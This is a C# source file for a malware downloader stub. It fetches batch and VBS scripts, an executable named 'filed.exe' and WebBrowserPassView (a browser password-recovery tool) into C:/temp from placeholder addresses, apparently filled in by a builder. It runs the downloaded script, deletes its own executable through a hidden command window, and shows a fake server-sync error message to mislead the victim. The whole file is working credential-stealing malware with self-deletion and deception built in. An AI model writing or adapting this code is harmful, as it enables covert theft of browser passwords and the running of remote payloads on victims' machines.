using System;
using System.IO;
using System.Windows.Forms;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;

public class download
{
    public static void Main()
    {
            {
				string _pwTemp = @"C:/temp";
				DirectoryInfo di = Directory.CreateDirectory(_pwTemp);
                using (WebClient webClient = new WebClient())
                   webClient.DownloadFile("finalresbatch", @"C:/temp/finalres.bat");
                using (WebClient webClient = new WebClient())
                    webClient.DownloadFile("finalresvbs", @"C:/temp/finalres.vbs");
                using (WebClient webClient = new WebClient())
                    webClient.DownloadFile("finalresVbs2", @"C:/temp/finalres2.vbs");
                using (WebClient webClient = new WebClient())
                    webClient.DownloadFile("sendhookfile", @"C:/temp/filed.exe");
				using (WebClient webClient = new WebClient())
                    webClient.DownloadFile("webbrowserpassview", @"C:/temp/WebBrowserPassView.exe");

            }
            if (File.Exists(@"C:/temp/finalres.vbs"))
            {
                Process run_bat = new Process();
                run_bat.EnableRaisingEvents = false;
                run_bat.StartInfo.FileName = @"C:/temp/finalres.vbs";
                run_bat.Start();

                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            else
            {
                MessageBox.Show("An error occured while syncing to our servers. Please try again later!");
            }
    }
}